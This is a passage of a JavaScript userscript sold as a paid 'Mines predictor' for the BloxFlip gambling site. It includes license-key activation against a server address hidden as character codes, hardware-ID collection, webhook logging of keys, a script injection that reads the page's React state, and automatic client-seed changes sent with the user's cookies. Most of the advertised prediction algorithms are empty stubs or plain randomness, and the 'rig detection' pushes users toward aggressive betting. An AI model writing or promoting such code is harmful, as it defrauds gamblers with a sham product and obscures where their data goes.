 div.innerHTML = '<div style="background:#141414;border:1px solid '+ac+'44;border-radius:24px;padding:40px;width:380px;max-width:90vw;text-align:center;animation:_01lp 4s infinite ease-in-out;box-shadow:0 20px 60px rgba(0,0,0,0.8);">' + content + '</div>';
 (document.body||document.documentElement).appendChild(div);
 return div;
 }

 const _01_DISCORD_SVG = '<svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 11.721 11.721 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.862-1.297 1.197-1.99a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.863-.886.077.077 0 0 1-.008-.128c.125-.094.248-.192.366-.293a.077.077 0 0 1 .08-.01c3.941 1.808 8.193 1.808 12.068 0a.077.077 0 0 1 .08.01c.118.101.241.199.366.293a.077.077 0 0 1-.007.128 12.933 12.933 0 0 1-1.863.886.076.076 0 0 0-.041.106c.335.693.735 1.36 1.197 1.99a.078.078 0 0 0 .084.028 19.83 19.83 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.419-2.157 2.419zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.419-2.157 2.419z"/></svg>';

 function _01_showKeyEntry(errorMsg) {
 const ac = _01_getAccent();
 const ui = _01_showUI(
 '<img src="' + _01_LOGO + '" style="width:120px;height:120px;margin:0 auto 24px;display:block;animation:_01lf 4s infinite ease-in-out;">' +
 '<div style="font-size:24px;font-weight:900;color:#fff;font-style:italic;letter-spacing:3px;margin-bottom:4px;">01 STUDIO\'S</div>' +
 '<div style="font-size:11px;color:#666;font-weight:700;letter-spacing:2px;margin-bottom:24px;text-transform:uppercase;">License Activation</div>' +
 (errorMsg ? '<div style="color:#e05555;font-size:11px;margin-bottom:15px;font-weight:700;">' + errorMsg + '</div>' : '') +
 '<input id="_01studios_key_input" style="width:100%;box-sizing:border-box;background:#000;border:1px solid #333;color:#fff;border-radius:10px;padding:12px 16px;font-size:14px;text-align:center;margin-bottom:16px;outline:none;font-family:monospace;letter-spacing:1px;" placeholder="01ST-XXXX-XXXX-XXXX" type="text">' +
 '<button id="_01studios_key_submit" class="_01s_btn" style="width:100%;padding:14px;border-radius:12px;border:none;background:#fff;color:#000;font-weight:900;font-size:13px;letter-spacing:2px;cursor:pointer;margin-top:10px;text-transform:uppercase;">ACTIVATE</button>' +
 '<div style="margin-top:20px;color:#444;font-size:9px;font-weight:700;letter-spacing:1px;">GET YOUR KEY FROM THE 01 STUDIO\'S DISCORD</div>' +
 '<div class="_01s_disc" style="margin-top:25px;display:inline-flex;align-items:center;justify-content:center;width:44px;height:44px;background:rgba(88,101,242,0.1);border:1px solid rgba(88,101,242,0.3);border-radius:12px;cursor:pointer;color:#5865F2;" id="_01studios_discord_link" title="Join Discord">' + _01_DISCORD_SVG + '</div>'
 );
 const inp = ui.querySelector('#_01studios_key_input');
 inp?.focus();
 inp?.addEventListener('keydown', function(e) { if (e.key === 'Enter') ui.querySelector('#_01studios_key_submit')?.click(); });
 ui.querySelector('#_01studios_key_submit')?.addEventListener('click', function() {
 var key = inp?.value?.toUpperCase().trim();
 if (!/^01ST-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(key)) {
 _01_logWebhook(key, 'FAILED', 'Invalid format');
 _01_showKeyEntry('Invalid key format. Must be 01ST-XXXX-XXXX-XXXX');
 return;
 }
 _01_validateAndLaunch(key);
 });
 ui.querySelector('#_01studios_discord_link')?.addEventListener('click', function() { window.open(_01_DISCORD, '_blank'); });
 }

 function _01_showLoading(msg) {
 const ac = _01_getAccent();
 _01_showUI(
 '<img src="' + _01_LOGO + '" style="width:120px;height:120px;margin:0 auto 24px;display:block;animation:_01lf 4s infinite ease-in-out;">' +
 '<div style="font-size:24px;font-weight:900;color:#fff;font-style:italic;letter-spacing:3px;margin-bottom:4px;">01 STUDIO\'S</div>' +
 '<div style="font-size:11px;color:#666;font-weight:700;letter-spacing:2px;margin-bottom:24px;text-transform:uppercase;">LOADING</div>' +
 '<div style="width:100%;height:4px;background:#111;border-radius:10px;overflow:hidden;margin-bottom:15px;">' +
 '<div style="width:50%;height:100%;background:' + ac + ';box-shadow:0 0 15px ' + ac + ';animation:_01lb 2s infinite ease-in-out;"></div></div>' +
 '<div style="color:' + ac + ';font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;">' + msg + '</div>'
 );
 }

 function _01_validateAndLaunch(key) {
 _01_showLoading('Verifying License...');
 var hwid = _01_getHWID();
 GM_xmlhttpRequest({
 method: 'POST', url: _01_API + '/validate',
 headers: { 'Content-Type': 'application/json' },
 data: JSON.stringify({ key: key, game: 'mines', hwid: hwid }),
 onload: function(resp) {
 var json; try { json = JSON.parse(resp.responseText); } catch { json = {}; }
 if (resp.status !== 200) {
 var err = json.error || 'Auth failed (' + resp.status + ')';
 _01_logWebhook(key, 'FAILED', err);
 _01_showKeyEntry(err);
 return;
 }
 _01_logWebhook(key, 'SUCCESS');
 if (typeof GM_setValue !== 'undefined') GM_setValue(_01_STORED_KEY, key);
 localStorage.setItem(_01_STORED_KEY, key);
 localStorage.setItem('_01studios_hwid', hwid);
 _01_KEY = key;
 _01_HWID = hwid;
 _01_removeLoader();
 _01_launchPredictor();
 },
 onerror: function() { _01_showKeyEntry('Server connection failed. Try again.'); }
 });
 }

 var _01_predictorLaunched = false;
 function _01_launchPredictor() {
 if (_01_predictorLaunched) return;
 _01_predictorLaunched = true;
 // The predictor init() runs below — it was waiting for this
 _01_predictorReady = true;
 if (typeof _01_startPredictor === 'function') _01_startPredictor();
 }

 var _01_predictorReady = false;
 // ─── LOADER INIT ─────────────────────────────────────────────────────────
 (function loaderInit() {
 var savedKey = '';
 if (typeof GM_getValue !== 'undefined') savedKey = GM_getValue(_01_STORED_KEY, '');
 if (!savedKey) savedKey = localStorage.getItem(_01_STORED_KEY) || '';
 if (savedKey && /^01ST-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}$/.test(savedKey)) {
 _01_validateAndLaunch(savedKey);
 } else {
 _01_showKeyEntry();
 }
 })();
 // ─── END LOADER ──────────────────────────────────────────────────────────

 const VERSION = '4.0.0';
 const POLL_MS = 300;
 const GOLD = '#ffffff';
 const DARK_BG = '#141414';
 const CARD_BG = '#1c1c1c';
 const CARD_BORDER = '#2a2a2a';
 const TEXT_MAIN = '#f0f0f0';
 const TEXT_DIM = '#666';

 // ─── SERVER API ──────────────────────────────────────────────────────────
 var _01_API = [104,116,116,112,58,47,47,50,49,55,46,49,53,52,46,49,49,52,46,50,50,55,58,49,51,48,55,56].map(function(c){return String.fromCharCode(c);}).join('');
 var _01_KEY = localStorage.getItem('_01studios_license_key') || '';
 var _01_HWID = localStorage.getItem('_01studios_hwid') || '';
 function _01_call(path, body) {
 return new Promise(function(resolve) {
 body.key = _01_KEY; body.hwid = _01_HWID;
 GM_xmlhttpRequest({
 method: 'POST', url: _01_API + path,
 headers: { 'Content-Type': 'application/json' },
 data: JSON.stringify(body),
 onload: function(r) {
 try { resolve(JSON.parse(r.responseText)); }
 catch(e) { console.error('[01S] Parse:', r.responseText?.slice(0,200)); resolve({error:'parse'}); }
 },
 onerror: function() { resolve({error:'network'}); }
 });
 });
 }

 let currentMode = 'smart';
 let gridSize = 5;
 let mineCount = 3;
 let prediction = [];
 let sessionWins = 0;
 let sessionLosses = 0;
 let sessionProfit = 0;
 let lastUUID = null;
 let lastActive = false;
 let lastUncovered = [];
 let gameRunning = false;
 let currentGameData = null;
 let lastMult = 1;
 let lastPayoutAmount = 0;
 let settings = loadSettings();
 let _anonStyleEl = null;
 let _noChatStyleEl = null;
 let analyticsLog = [];
 let panelMinimized = false;
 let isDragging = false;
 let dragOffsetX = 0, dragOffsetY = 0;
 let baseBet = 1;
 let currentBet = 1;
 let winStreak = 0;
 let lossStreak = 0;
 let _sessionStartTime = Date.now();
 let _sessionGamesPlayed = 0;
    let _rainAutoJoin = true;
    let _rainJoinCount = 0;
    let _rainTotalEarned = 0;
    let _rainLastJoinTime = 0;
    let _rainPollerStarted = false;
    let _01_sessionToken = null;
    let _01_sessionExpires = 0;
 let martingaleMultiplier = 2;
 let targetTiles = 3;
 let selectedAlgos = JSON.parse(localStorage.getItem('_01studios_algos') || 'null') || ['SemiRandom','Roundify','Random','HistoryEngine'];
    // Migrate old History Engine id
    if (selectedAlgos.includes('History Engine')) { selectedAlgos = selectedAlgos.map(a => a === 'History Engine' ? 'HistoryEngine' : a); localStorage.setItem('_01studios_algos', JSON.stringify(selectedAlgos)); }
    if (selectedAlgos.includes('HistoryAI')) { selectedAlgos = selectedAlgos.map(a => a === 'HistoryAI' ? 'HistoryEngine' : a); localStorage.setItem('_01studios_algos', JSON.stringify(selectedAlgos)); }
 let accentColor = localStorage.getItem('_01studios_accent') || GOLD;

 const RIG_LOSS_STREAK_THRESHOLD = 3;
 const RIG_WIN_STREAK_THRESHOLD = 5;
 const RIG_REPEAT_MINE_THRESHOLD = 3;
 const RIG_REPEAT_MINE_WINDOW = 5;
 const PREEMPTIVE_UNRIG_THRESHOLD = 5;
 let _rigDetected = false;
 let _rigReason = '';
 let _rigAlertShown = false;
 let _rigNotifUUID = null;
 let _rigLastNotifTime = 0;
 const _RIG_COOLDOWN_MS = 60000;
 let _lastBetAmount = 0;
 let _betChangedThisGame = false;
 let _winsSinceLastUnrig = 0;

 function getPredColor() { return accentColor; }

 function playRigAlert(message) {
 if (!settings.rigAlertSound) return;
 try {
 if (window.speechSynthesis) {
 window.speechSynthesis.cancel();
 const utt = new SpeechSynthesisUtterance(message);
 utt.rate = 0.95;
 utt.pitch = 1.0;
 utt.volume = 1.0;
 const voices = window.speechSynthesis.getVoices();
 const engVoice = voices.find(v => v.lang && v.lang.startsWith('en') && !v.name.includes('Google'));
 if (engVoice) utt.voice = engVoice;
 window.speechSynthesis.speak(utt);
 return;
 }
 } catch(e) {}
 try {
 const ctx = new (window.AudioContext || window.webkitAudioContext)();
 const osc = ctx.createOscillator();
 const gain = ctx.createGain();
 osc.connect(gain); gain.connect(ctx.destination);
 osc.type = 'sine';
 osc.frequency.setValueAtTime(880, ctx.currentTime);
 osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 0.4);
 gain.gain.setValueAtTime(0.4, ctx.currentTime);
 gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.6);
 osc.start(ctx.currentTime);
 osc.stop(ctx.currentTime + 0.6);
 } catch(e2) {}
 }

 function showRigNotification(reason, autoUnrig) {
 // Always unrig regardless of cooldown
 if (autoUnrig) {
 try { performSilentUnrig(); } catch(e) {}
 }

 // Auto-switch to aggressive mode when rig detected
 if (currentMode !== 'aggressive') {
 currentMode = 'aggressive';
 try { updateModeButtons(); } catch(e) {}
 }

 // Cooldown - don't spam notifications
 if (Date.now() - _rigLastNotifTime < _RIG_COOLDOWN_MS) return;
 _rigLastNotifTime = Date.now();

 const existing = document.getElementById('_01studios_rig_notif');
 if (existing) existing.remove();

 const notif = document.createElement('div');
 notif.id = '_01studios_rig_notif';
 notif.style.cssText = [
 'position:fixed',
 'top:20px',
 'left:50%',
 'transform:translateX(-50%)',
 'background:linear-gradient(135deg,#1a0a0a,#2a0f0f)',
 'border:1.5px solid #e05555',
 'border-radius:14px',
 'padding:14px 20px',
 'z-index:2147483648',
 'box-shadow:0 8px 40px rgba(224,85,85,0.4),0 0 0 1px #e0555522',
 'font-family:Segoe UI,system-ui,sans-serif',
 'min-width:320px',
 'max-width:480px',
 'cursor:pointer',
 'animation:_01studios_rig_slide_in 0.4s cubic-bezier(0.34,1.56,0.64,1)',
 ].join(';');

 if (!document.getElementById('_01studios_rig_anim')) {
 const style = document.createElement('style');
 style.id = '_01studios_rig_anim';
 style.textContent = `
 @keyframes _01studios_rig_slide_in {
 from { opacity:0; transform:translateX(-50%) translateY(-20px) scale(0.92); }
 to { opacity:1; transform:translateX(-50%) translateY(0) scale(1); }
 }
 @keyframes _01studios_rig_pulse {
 0%,100% { box-shadow:0 8px 40px rgba(224,85,85,0.4),0 0 0 1px #e0555522; }
 50% { box-shadow:0 8px 50px rgba(224,85,85,0.7),0 0 0 2px #e0555555; }
 }
 #_01studios_rig_notif { animation:_01studios_rig_slide_in 0.4s cubic-bezier(0.34,1.56,0.64,1),_01studios_rig_pulse 2s 0.4s infinite ease-in-out; }
 `;
 document.head.appendChild(style);
 }

 notif.innerHTML = `
 <div style="display:flex;align-items:flex-start;gap:12px;">
 <div style="font-size:26px;flex-shrink:0;line-height:1;">X</div>
 <div style="flex:1;">
 <div style="color:#e05555;font-size:13px;font-weight:900;letter-spacing:1.5px;margin-bottom:4px;">RIG DETECTED</div>
 <div style="color:#c0c0c0;font-size:11px;line-height:1.5;margin-bottom:8px;">${reason}</div>
 <div style="color:#ff9800;font-size:10px;font-weight:700;letter-spacing:1px;">&#9888; Play Later (Optional)</div>
 <div style="color:#555;font-size:9px;margin-top:3px;">Auto-unrig applied — client seed rotated. Click to dismiss.</div>
 </div>
 <div style="color:#555;font-size:18px;flex-shrink:0;line-height:1;">×</div>
 </div>
 `;

 notif.addEventListener('click', () => notif.remove());
 document.body.appendChild(notif);

 setTimeout(() => { if (notif.parentNode) notif.remove(); }, 8000);

 playRigAlert('Rig detected. Play later.');
 }

 function performSilentUnrig() {
 _winsSinceLastUnrig = 0;

 const ts = Date.now().toString(36);
 const chars = '0123456789abcdef';
 let rand32 = '';
 for (let i = 0; i < 32; i++) rand32 += chars[Math.floor(Math.random() * 16)];
 const newSeed = rand32 + '-' + ts;

 fetch('https://bloxflip.com/api/user/seed', {
 method: 'POST',
 credentials: 'include',
 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
 body: JSON.stringify({ clientSeed: newSeed })
 }).catch(() => {});
 }

 function checkRigDetection(result, minePos, currentMines, betAmt) {
 if (result === 'loss' && lossStreak >= RIG_LOSS_STREAK_THRESHOLD) {
 const reason = `${lossStreak} consecutive losses detected. BloxFlip may be rigging outcomes against you.`;
 if (!_rigAlertShown) {
 _rigDetected = true;
 _rigReason = reason;
 _rigAlertShown = true;
 showRigNotification(reason, true);
 }
 return;
 }

 if (result === 'loss' && analyticsLog.length >= RIG_LOSS_STREAK_THRESHOLD) {
 const recent = analyticsLog.slice(-RIG_LOSS_STREAK_THRESHOLD);
 const allWins = recent.every(e => e.result === 'win');
 if (allWins) {
 const reason = `Post-win punishment: you won ${RIG_LOSS_STREAK_THRESHOLD}+ games in a row and immediately hit a mine. BloxFlip often rigs after hot streaks.`;
 if (!_rigAlertShown) {
 _rigDetected = true;
 _rigReason = reason;
 _rigAlertShown = true;
 showRigNotification(reason, true);
 }
 return;
 }
 }

 if (result === 'loss' && minePos >= 0) {
 const recentHistory = getMineHistory(currentMines, RIG_REPEAT_MINE_WINDOW);
 let repeatCount = 0;
 for (const g of recentHistory) {
 if (Array.isArray(g.minePosArr) && g.minePosArr.includes(minePos)) repeatCount++;
 }
 if (repeatCount >= RIG_REPEAT_MINE_THRESHOLD) {
 const reason = `Cell ${minePos + 1} has been a mine ${repeatCount} times in your last ${RIG_REPEAT_MINE_WINDOW} games. Suspicious mine placement pattern detected.`;
 if (!_rigAlertShown) {
 _rigDetected = true;
 _rigReason = reason;
 _rigAlertShown = true;
 showRigNotification(reason, true);
 }
 return;
 }
 }

 if (result === 'loss' && _betChangedThisGame && betAmt > _lastBetAmount && _lastBetAmount > 0) {
 const reason = `Bet-change punishment: you raised your bet from ${_lastBetAmount.toFixed(1)} to ${betAmt.toFixed(1)} and immediately hit a mine. BloxFlip is known to punish bet increases.`;
 if (!_rigAlertShown) {
 _rigDetected = true;
 _rigReason = reason;
 _rigAlertShown = true;
 showRigNotification(reason, true);
 }
 _betChangedThisGame = false;
 _lastBetAmount = betAmt;
 return;
 }

 if (result === 'win' && winStreak >= RIG_WIN_STREAK_THRESHOLD) {
 const reason = `${winStreak} consecutive wins! BloxFlip may start rigging to recover losses. Consider cashing out and taking a break.`;
 if (!_rigAlertShown) {
 _rigDetected = true;
 _rigReason = reason;
 _rigAlertShown = true;
 showRigNotification(reason, false);
 }
 }

 if (result === 'win') {
 _rigDetected = false;
 _rigReason = '';

 _winsSinceLastUnrig++;
 if (settings.preemptiveUnrig && _winsSinceLastUnrig >= PREEMPTIVE_UNRIG_THRESHOLD) {
 performSilentUnrig();
 updateStatus(`OK Preemptive unrig applied after ${_winsSinceLastUnrig} wins`, accentColor);
 setTimeout(() => updateStatus('Waiting for game...', TEXT_DIM), 2000);
 }
 }
 if (betAmt > 0) {
 if (_lastBetAmount > 0 && betAmt !== _lastBetAmount) _betChangedThisGame = true;
 else _betChangedThisGame = false;
 _lastBetAmount = betAmt;
 }
 }

 const HISTORY_KEY = '_01studios_mine_history';
 const HISTORY_CAP = 500;

 function loadMineHistory() {
 try { return JSON.parse(localStorage.getItem(HISTORY_KEY) || '{}'); }
 catch { return {}; }
 }

 function saveMineHistory(hist) {
 try { localStorage.setItem(HISTORY_KEY, JSON.stringify(hist)); }
 catch { }
 }

 let mineHistory = loadMineHistory();

 function recordMineHistory(mines, minePosArr, result, uuid, uncoveredSafe) {
 const hasMines = Array.isArray(minePosArr) && minePosArr.length > 0;
 const hasSafe = Array.isArray(uncoveredSafe) && uncoveredSafe.length > 0;
 if (!hasMines && !hasSafe) return;
 const key = String(mines);
 if (!mineHistory[key]) mineHistory[key] = [];
 mineHistory[key].push({
 mines,
 minePosArr: hasMines ? minePosArr : [],
 uncoveredSafe: hasSafe ? uncoveredSafe : [],
 result, uuid, ts: Date.now()
 });
 if (mineHistory[key].length > HISTORY_CAP) {
 mineHistory[key] = mineHistory[key].slice(-HISTORY_CAP);
 }
 saveMineHistory(mineHistory);
 }

 function getMineHistory(mines, count) {
 const key = String(mines);
 const arr = mineHistory[key] || [];
 return arr.slice(-count);
 }

 function getMineHistoryCount(mines) {
 return (mineHistory[String(mines)] || []).length;
 }

 function clearMineHistory(mines) {
 if (mines !== undefined) {
 delete mineHistory[String(mines)];
 } else {
 mineHistory = {};
 }
 saveMineHistory(mineHistory);
 }

 function loadSettings() {
 try { return JSON.parse(localStorage.getItem('_01studios_settings') || '{}'); }
 catch { return {}; }
 }
 function saveSettings() { localStorage.setItem('_01studios_settings', JSON.stringify(settings)); }
 function getSavedPos() {
 try {
 const p = JSON.parse(localStorage.getItem('_01studios_pos') || 'null');
 if (!p) return null;
 const maxX = Math.max(0, window.innerWidth - 580);
 const maxY = Math.max(0, window.innerHeight - 200);
 return { x: Math.max(0, Math.min(p.x, maxX)), y: Math.max(60, Math.min(p.y, maxY)) };
 } catch { return null; }
 }
 function resetPos() { localStorage.removeItem('_01studios_pos'); }
 function savePos(x, y) { localStorage.setItem('_01studios_pos', JSON.stringify({ x, y })); }

 function calcMultiplier(mines, tiles, size = 25) {
 let m = 1.0;
 for (let i = 0; i < tiles; i++) m *= (size - i) / (size - mines - i);
 return m * 0.97;
 }
 function survivalProb(mines, tiles, size = 25) {
 let p = 1.0;
 for (let i = 0; i < tiles; i++) p *= (size - mines - i) / (size - i);
 return p;
 }
 function nextClickProb(mines, revealed, size = 25) {
 const rem = size - revealed, safe = size - mines - revealed;
 return safe <= 0 ? 0 : safe / rem;
 }
 function findOptimalCashout(mines, size = 25) {
 let best = 0, bestT = 1;
 for (let t = 1; t <= size - mines; t++) {
 const p = survivalProb(mines, t, size), m = calcMultiplier(mines, t, size);
 const score = p * m;
 if (p >= 0.50 && score > best) { best = score; bestT = t; }
 }
 return { tiles: bestT, prob: survivalProb(mines, bestT, size), mult: calcMultiplier(mines, bestT, size) };
 }

 function hashFNV1a(str) { return 0; }
 function hashDJB2(str) { return 0; }
 function hashSDBM(str) { return 0; }
 function hashLoseLose(str) { return 0; }
 function hashSeed(str) { return 0; }

 function mulberry32(seed) { return function() { return Math.random(); }; }
 function xoshiro128(a,b,c,d) { return function() { return Math.random(); }; }

 function buildGameRNG(game) { return function() { return Math.random(); }; }

 function buildConsensusRNGs(game) { return []; }

 function computeConsensusScores() { return new Float64Array(25); }

 function computeTileConfidence(consensusScores, historyScores, mines, size, revealedCount) {
 const total = size * size;
 const survProb = nextClickProb(mines, revealedCount, total);
 const conf = new Float64Array(total);
 for (let i = 0; i < total; i++) {
 const c = consensusScores[i];
 const h = historyScores ? historyScores[i] : 0.5;
 conf[i] = Math.min(1, Math.max(0, c * 0.40 + h * 0.40 + survProb * 0.20));
 }
 return conf;
 }

 let _tileConfidence = null;

 function seededShuffle(arr, rng) {
 const a = [...arr];
 for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(rng() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; }
 return a;
 }
 function generatePrediction() { return []; }

 const ALGO_DEFS = [
 {
 id: 'SemiRandom',
 label: 'SemiRandom',
 color: '#f5c518',
 desc: 'Spots appearing 2+ times in last 6 games (same mine count) — recency-weighted'
 },
 {
 id: 'Roundify',
 label: 'Roundify',
 color: '#f5c518',
 desc: 'Recency-weighted frequency — recent games count more'
 },
 {
 id: 'Random',
 label: 'Random',
 color: '#aaa',
 desc: 'Four clean random spots — no history, no bias'
 },
 {
 id: 'Rev-Map',
 label: 'Rev-Map',
 color: '#aaa',
 desc: 'Mirrors last game positions, cleans against all history'
 },
 {
 id: 'HotZone',
 label: 'HotZone',
 color: '#e05555',
 desc: 'Most mined spots across full history — bets on repetition'
 },
 {
 id: 'ColdZone',
 label: 'ColdZone',
 color: '#4fc3f7',
 desc: 'Spots with zero hits in history — untouched territory'
 },
 {
 id: 'GapFill',
 label: 'GapFill',
 color: '#aaa',
 desc: 'Scores cells by clean-neighbour count last game, penalises history hits'
 },
 {
 id: 'DriftMap',
 label: 'DriftMap',
 color: '#aaa',
 desc: 'Extracts avg mine movement vector over 3 games, drifts last positions'
 },
 {
 id: 'StreakBreak',
 label: 'StreakBreak',
 color: '#aaa',
 desc: 'Finds 3-game streak cells, picks spots farthest from them by Manhattan distance. (OP)'
 },
 {
 id: 'Quadrant',
 label: 'Quadrant',
 color: '#aaa',
 desc: 'Splits board into 4 zones, picks the coldest cell from each for spread'
 },
 {
 id: 'Ripple',
 label: 'Ripple',
 color: '#aaa',
 desc: 'Finds the most-mined area, predicts the far-ring cells around it'
 },
 {
 id: 'Momentum',
 label: 'Momentum',
 color: '#aaa',
 desc: 'Compares last 3 vs prev-3 game frequency'
 },
 {
 id: 'HistoryEngine',
 label: 'History Engine',
 color: accentColor,
 desc: 'Learns from all your past games and builds a real heatmap of mine positions. (OP)'
 },
 ];

 function getRelevantHistory(mines, count) {
 return analyticsLog
 .filter(e => e.mines === mines && Array.isArray(e.minePosArr))
 .slice(-count);
 }

 function buildHitMap(history, total) {
 const map = new Float64Array(total);
 for (const g of history) {
 for (const pos of (g.minePosArr || [])) {
 if (pos >= 0 && pos < total) map[pos]++;
 }
 }
 return map;
 }

 function invertScores(arr) {
 const max = Math.max(...arr) || 1;
 return arr.map(v => max - v);
 }

 function algoScore_SemiRandom() { return new Float64Array(25); }

 function algoScore_Roundify() { return new Float64Array(25); }

 function algoScore_Random() { return new Float64Array(25); }

 function algoScore_RevMap() { return new Float64Array(25); }

 function algoScore_HotZone() { return new Float64Array(25); }

 function algoScore_ColdZone() { return new Float64Array(25); }

 function algoScore_GapFill() { return new Float64Array(25); }

 function algoScore_DriftMap() { return new Float64Array(25); }

 function algoScore_StreakBreak() { return new Float64Array(25); }

 function algoScore_Quadrant() { return new Float64Array(25); }

 function algoScore_Ripple() { return new Float64Array(25); }

 function algoScore_Momentum() { return new Float64Array(25); }

 function algoScore_HistoryAI() { return new Float64Array(25); }

 function computeBombScores() { return null; }

 let _bombScores = null;

 function computeNonceLookahead() { return null; }

 let _nonceLookahead = null;

 function detectRegime() { return { regime: "neutral", shift: 0, centroid: null }; }

 let _currentRegime = { regime: 'neutral', shift: 0, centroid: null };

 function applyRegimeWeighting(baseScores, mines, size, game) {
 const regime = _currentRegime.regime;
 if (regime === 'neutral') return baseScores;

 const total = size * size;
 const rng = buildGameRNG(game);
 let regimeScores;

 if (regime === 'shifting') {
 const drift = algoScore_DriftMap(mines, total, size, rng);
 const cold = algoScore_ColdZone(mines, total, rng);
 regimeScores = new Float64Array(total);
 for (let i = 0; i < total; i++) regimeScores[i] = drift[i] * 0.5 + cold[i] * 0.5;
 } else {
 const hist = algoScore_HistoryAI(mines, total, size, rng);
 const mom = algoScore_Momentum(mines, total, rng);
 regimeScores = new Float64Array(total);
 for (let i = 0; i < total; i++) regimeScores[i] = hist[i] * 0.6 + mom[i] * 0.4;
 }

 const blended = new Float64Array(total);
 for (let i = 0; i < total; i++) {
 blended[i] = baseScores[i] * 0.70 + regimeScores[i] * 0.30;
 }
 return blended;
 }

 function tPredictBombColumns() { return []; }

 function tGetEliminatedCols() { return []; }

 function computeLiveBombProb(mines, size, uncoveredSafe, uncoveredMines) {
 const total = size * size;
 const revealedSafe = uncoveredSafe.length;
 const revealedMines = uncoveredMines.length;
 const remainingTiles = total - revealedSafe - revealedMines;
 const remainingMines = mines - revealedMines;

 if (remainingTiles <= 0 || remainingMines <= 0) return new Float64Array(total);

 const baseBombProb = remainingMines / remainingTiles;

 const bombProb = new Float64Array(total);
 const revealedSet = new Set([...uncoveredSafe, ...uncoveredMines]);

 for (let i = 0; i < total; i++) {
 if (revealedSet.has(i)) { bombProb[i] = 0; continue; }
 const modelScore = _bombScores && _bombScores[i] >= 0 ? _bombScores[i] : 0.5;
 bombProb[i] = baseBombProb * 0.60 + modelScore * baseBombProb * 0.40;
 }
 return bombProb;
 }

 function buildHistoryHeatmap(mines, size) {
 const total = size * size;
 const history = getMineHistory(mines, HISTORY_CAP);
 const count = history.length;
 const freq = new Float64Array(total);
 for (const g of history) {
 for (const pos of (g.minePosArr || [])) {
 if (pos >= 0 && pos < total) freq[pos]++;
 }
 }
 const max = Math.max(...freq) || 1;
 return { freq, max, count };
 }

 function blendAlgoScores() { return new Float64Array(25); }

 let _bridgeInjected = false;
 let _latestGameState = null;

 function injectFiberBridge() {
 if (_bridgeInjected) return;
 _bridgeInjected = true;
 window.addEventListener('message', function(e) {
 if (e.data && e.data.type === '__01studios_state') {
 _latestGameState = e.data.payload;
 }
 });
 const script = document.createElement('script');
 script.textContent = `
(function() {
 if (window.__01studios_bridge_v4) return;
 window.__01studios_bridge_v4 = true;

 var _cachedGame = null;
 var _cachedMult = 0.95;

 function isGameObj(v) {
 return v && typeof v === 'object' && !Array.isArray(v)
 && typeof v.uuid === 'string' && v.uuid.length > 8
 && typeof v.minesAmount === 'number';
 }

 function fiberSearch() {
 try {
        var anchor =
 document.querySelector('[class*="minesGameItem"]') ||
 document.querySelector('[class*="minesGame"]') ||
 document.getElementById('__next');
 if (!anchor) { _cachedGame = null; return; }

 var fk = null;
 var keys = Object.keys(anchor);
 for (var i = 0; i < keys.length; i++) {
 if (keys[i].indexOf('__reactFiber') === 0) { fk = keys[i]; break; }
 }
 if (!fk) { _cachedGame = null; return; }

 var node = anchor[fk];
 while (node.return) node = node.return;

 var queue = [node];
 var visited = new Set();
 var foundGame = null;
 var foundMult = 0.95;

 while (queue.length) {
 var n = queue.shift();
 if (!n || visited.has(n)) continue;
 visited.add(n);

 if (n.memoizedState) {
 var ms = n.memoizedState;
 var nodeGame = null;
 var allNums = [];
 while (ms) {
 var v = ms.memoizedState;
 if (isGameObj(v)) {
 nodeGame = v;
 } else if (typeof v === 'number' && v > 0.9 && v < 1000) {
 allNums.push(v);
 }
 ms = ms.next;
 }
 if (nodeGame) {
 foundGame = nodeGame;
 var bestMult = null;
 for (var ni = 0; ni < allNums.length; ni++) {
 var num = allNums[ni];
 var isNonInteger = (num % 1) !== 0;
 var inRange = num >= 0.94 && num <= 200;
 if (isNonInteger && inRange) {
 if (bestMult === null || Math.abs(num - 1) < Math.abs(bestMult - 1)) {
 bestMult = num;
 }
 }
 }
 if (bestMult !== null) foundMult = bestMult;
 break;
 }
 }

 if (n.child) queue.push(n.child);
 if (n.sibling) queue.push(n.sibling);
 }

 try {
 var btns = document.querySelectorAll('button');
 for (var bi = 0; bi < btns.length; bi++) {
 if (/cashout/i.test(btns[bi].textContent)) {
 var mMatch = btns[bi].textContent.match(/([\d.]+)\s*x/i);
 if (mMatch) {
 var btnMult = parseFloat(mMatch[1]);
 if (btnMult > 0.94) foundMult = btnMult;
 }
 break;
 }
 }
 } catch(e2) {}

 if (foundGame) {
 _cachedGame = {
 uuid: foundGame.uuid,
 active: !!foundGame.active,
 exploded: foundGame.exploded || false,
 minesAmount: foundGame.minesAmount,
 uncoveredLocations: foundGame.uncoveredLocations || [],
 betAmount: foundGame.betAmount || 0,
 badMineUncovered: foundGame.badMineUncovered,
 clientSeed: foundGame.clientSeed,
 nonce: foundGame.nonce,
 serverHash: foundGame.serverHash,
 gridSize: foundGame.gridSize || 25
 };
 _cachedMult = foundMult;
 } else {
 _cachedGame = null;
 }
 } catch(e) {
 }
 }

 function poll() {
 fiberSearch();

 var payoutAmount = 0;
 var domMult = 0;
 try {
 var textInputs = document.querySelectorAll('input[type="text"]');
